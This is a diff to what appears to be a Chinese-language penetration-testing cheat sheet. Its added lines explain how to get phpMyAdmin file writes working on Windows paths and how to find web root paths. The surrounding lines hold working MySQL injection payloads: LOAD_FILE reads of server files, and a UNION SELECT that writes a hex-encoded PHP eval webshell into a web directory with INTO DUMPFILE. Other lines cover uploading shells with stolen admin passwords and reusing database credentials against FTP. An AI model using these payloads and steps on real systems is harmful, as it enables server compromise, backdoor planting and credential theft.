@@ -836,6 +836,7 @@
    udf:http://www.cnblogs.com/qing123/p/4676808.html
    outfile和dumpfile区别:http://www.dedecms.com/knowledge/data-base/mysql/2012/0819/7569.html
    在phpmyadmin中
+   windows系统在phpmyadmin的web后台写文件时写成into dumpfile 'c:<span class="se">\w</span>ww<span class="se">\s</span>ome<span class="se">\1</span>.php'无法写入时，改成into dumpfie 'c:<span class="se">\\</span>www<span class="se">\\</span>some<span class="se">\\</span>1.php'
    SELECT HEX(LOAD_FILE(0x2f70687073747564792f7777772f72654475682e706870))INTO DUMPFILE　'/phpstudy/www/121.txt'    (/phpstudy/www/reDuh.php)  本地(linux)取hex值
    select unhex('...') into dumpfile 'c:/inetpub/wwwroot/memberinfo/....php';-- -成功,这样不会被转义,如果是outfile会被转义　远程dumpfile出去 (对方windows)
    同理写shell:bs/news.php?id=3 and 1=2 union select null,null,null,null,unhex('3C3F70687020406576616C28245F504F53545B27746F6D275D293B3F3E') into dumpfile 'C:/AAWServer/www/php/k82.php';
@@ -1156,6 +1157,7 @@
         a&gt;是否支持数据库外连
         b&gt;是否有phpmyadmin(扫目录)
             select ... into dumpfile ...
+                如果不知道写shell路径,可从phpmyadmin中找找数据库中存在的路径,实战中找到过phpmyadmin的web页面的路径
             如果不能写文件则通过查看数据库中的管理员用户名密码进后台上传shell
             或者用数据库中的其他密码尝试连接ftp
             或者如果数据库中有editor的setting,修改为可以上传php
